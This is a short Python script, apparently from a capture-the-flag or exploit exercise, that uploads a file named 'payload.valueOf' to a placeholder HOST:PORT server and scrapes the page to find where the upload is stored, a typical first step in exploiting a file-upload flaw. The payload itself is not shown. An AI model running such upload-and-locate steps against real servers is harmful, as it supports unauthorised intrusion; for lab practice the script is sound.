import requests
from bs4 import BeautifulSoup
import json
from re import findall, DOTALL

url = 'http://HOST:PORT'
path_regex = r'src="(.*?)"'

def uploadFile():
	files = {'file': open('payload.valueOf', 'rb')}
	r = requests.post(url = url+'/upload', files=files)
	id_get = json.loads(r.text)
	return id_get['id']

def getPathImg():
	id_get = uploadFile()
	r = requests.get(url=url+f'/{id_get}')
	path = findall(path_regex,r.text)[0]
	return path

print('Location save file: '+getPathImg())